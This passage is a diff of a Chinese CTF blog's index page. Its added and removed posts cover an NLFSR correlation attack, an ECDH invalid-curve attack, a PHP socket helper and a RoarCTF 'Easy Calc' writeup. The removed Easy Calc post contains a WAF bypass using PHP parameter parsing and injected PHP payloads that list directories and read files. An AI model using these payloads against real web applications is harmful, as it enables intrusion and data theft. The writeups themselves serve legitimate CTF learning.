+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">				o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">				suma += ao==o</span><br><span class="line">				sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">				sumc += (co^do)==o</span><br><span class="line">				</span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+<p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>
 
       
     </div>
@@ -693,7 +866,7 @@
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ECDH/" rel="tag">ECDH</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFSR/" rel="tag">LFSR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
     </div>
 
       
@@ -786,10 +959,10 @@
 
 
   
-    <article id="post-De1CTF[2020]-NLFSR" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-De1CTF[2020]-ECDH" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/" class="article-date">
+      <a href="/2020/05/11/De1CTF%5B2020%5D-ECDH/" class="article-date">
       <time datetime="2020-05-11T07:00:00.000Z" itemprop="datePublished">2020-05-11</time>
 </a>
 
@@ -805,7 +978,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-NLFSR/">De1CTF[2020]-NLFSR</a>
+      <a class="article-title" href="/2020/05/11/De1CTF%5B2020%5D-ECDH/">De1CTF[2020]-ECDH</a>
     </h1>
   
 
@@ -815,13 +988,11 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>首先看一下题目源码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> a, b, c, d, flag</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">"De1CTF&#123;"</span> + <span class="string">''</span>.join([hex(i)[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]) + <span class="string">"&#125;"</span></span><br><span class="line"><span class="keyword">assert</span> [len(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]] == [<span class="number">19</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">ma, mb, mc, md = <span class="number">0x505a1</span>, <span class="number">0x40f3f</span>, <span class="number">0x1f02</span>, <span class="number">0x31</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(r, m)</span>:</span> <span class="keyword">return</span> ((r &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffff</span>) ^ (bin(r &amp; m).count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">combine</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> a, b, c, d</span><br><span class="line">    a = lfsr(a, ma)</span><br><span class="line">    b = lfsr(b, mb)</span><br><span class="line">    c = lfsr(c, mc)</span><br><span class="line">    d = lfsr(d, md)</span><br><span class="line">    [ao, bo, co, do] = [i &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> [a, b, c, d]]</span><br><span class="line">    <span class="keyword">return</span> (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genkey</span><span class="params">(nb)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(nb*<span class="number">8</span>):</span><br><span class="line">        s += str(combine())</span><br><span class="line">    open(<span class="string">"data"</span>, <span class="string">"w+"</span>).write(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">genkey(<span class="number">128</span>*<span class="number">1024</span>)</span><br></pre></td></tr></table></figure>
-<p>可以看出这个属于非线性组合生成器 </p>
-<p>可以参考<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/nfsr-zh/" target="_blank" rel="noopener">CTF-WIKI</a>关于相关攻击的介绍</p>
-<p>回到本题目中，我们可以用脚本测试一下有哪些相关性，这里我们可以观察到有三组相关性</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">suma = <span class="number">0</span></span><br><span class="line">sumb = <span class="number">0</span></span><br><span class="line">sumc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ao <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">	<span class="keyword">for</span> bo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">		<span class="keyword">for</span> co <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">for</span> do <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">				o = (ao*bo) ^ (bo*co) ^ (bo*do) ^ co ^ do</span><br><span class="line">				suma += ao==o</span><br><span class="line">				sumb += (<span class="number">1</span>-(ao^bo))==o</span><br><span class="line">				sumc += (co^do)==o</span><br><span class="line">				</span><br><span class="line"><span class="keyword">print</span> suma*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumb*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="keyword">print</span> sumc*<span class="number">1.0</span>/<span class="number">16</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">0.75</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
-<p>因此我们可以首先恢复出a，然后根据a恢复出b，同时c，d也能直接恢复</p>
+        <p>定位到题目源码中最关键的部分——密钥交换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">	r = zero</span><br><span class="line">	tmp = p</span><br><span class="line">	<span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">	    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">	        r = add(r,tmp)</span><br><span class="line">	    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">		self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">		x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">		y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		key = (x,y)</span><br><span class="line">		result = mul(self.secret,key)</span><br><span class="line">		self.key = self.pointToKeys(result)</span><br><span class="line">		self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure>
+<p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p>
+<p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p>
+<p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>
 
       
     </div>
@@ -832,149 +1003,7 @@
 
       
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFSR/" rel="tag">LFSR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-RoarCTF[2019]-Easy Calc" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/" class="article-date">
-      <time datetime="2020-05-07T07:00:00.000Z" itemprop="datePublished">2020-05-07</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/">RoarCTF[2019]-Easy Calc</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>知识点：<strong>PHP的字符串解析特性</strong></p>
-<p>参考文章：<a href="https://www.freebuf.com/column/207936.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207936.html</a> </p>
-<p>PHP会将URL或body中的查询字符串关联到<code>$_GET</code>或<code>$_POST</code>。例如：<code>/?foo=bar</code>代表<code>Array([foo] =&gt; &quot;bar&quot;)</code>。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。如果一个IDS/IPS或WAF中有一条规则是当<code>news_id</code>参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;news.php?%20news[id%00&#x3D;42&quot;+AND+1&#x3D;0--</span><br></pre></td></tr></table></figure>
-<p>上述PHP语句的参数<code>%20news[id%00</code>的值将存储到$_GET[“news_id”]中。 </p>
-<p>有了这个知识，我们就可以绕过waf了。</p>
-<p>同时，我们需要了解几个php的函数</p>
-<ul>
-<li>scandir($dir) , 列出dir下的所有文件和目录，默认升序，如要降序，则用scandir($dir, 1)</li>
-<li>file_get_contents($file)，获取file的内容</li>
-<li>var_dump($var)，输出变量的相关信息 </li>
-</ul>
-<p>ok，然后就是实操</p>
-<p>第一步，获取目录下的所有文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
-<p>找到文件flagg</p>
-<p>第二步，获取文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%20num&#x3D;1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
-<p>成功拿到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-python2基于socket.socket类实现类似pwntools的交互方法" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/" class="article-date">
-      <time datetime="2020-05-06T07:00:00.000Z" itemprop="datePublished">2020-05-06</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/">python2基于socket.socket类实现类似pwntools的交互方法</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。</p>
-<p>由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntools中的交互方法。</p>
-<p>具体代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">12233</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysocket</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, myhost, myport)</span>:</span></span><br><span class="line">		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		self.client.connect((myhost, myport))</span><br><span class="line">		self.fd = self.client.makefile(<span class="string">'rw'</span>, <span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(self, delim = <span class="string">"\n"</span>)</span>:</span></span><br><span class="line">		buf = <span class="string">''</span></span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">not</span> buf.endswith(delim):</span><br><span class="line">			buf += self.fd.read(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> buf.strip()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, data)</span>:</span></span><br><span class="line">		self.fd.write(data)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">sendline</span><span class="params">(self, data)</span>:</span></span><br><span class="line">		self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">sendlineafter</span><span class="params">(self, data, delim = <span class="string">"\n"</span>, debug = False)</span>:</span></span><br><span class="line">		buf = self.recvuntil(delim)</span><br><span class="line">		<span class="keyword">if</span> debug:</span><br><span class="line">			<span class="keyword">print</span> buf.strip()</span><br><span class="line">		self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.client.close()</span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-<p>后续将根据实际情况继续扩展</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/socket/" rel="tag">socket</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ECDH/" rel="tag">ECDH</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
     </div>
 
       
@@ -996,7 +1025,7 @@
   
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 </div>
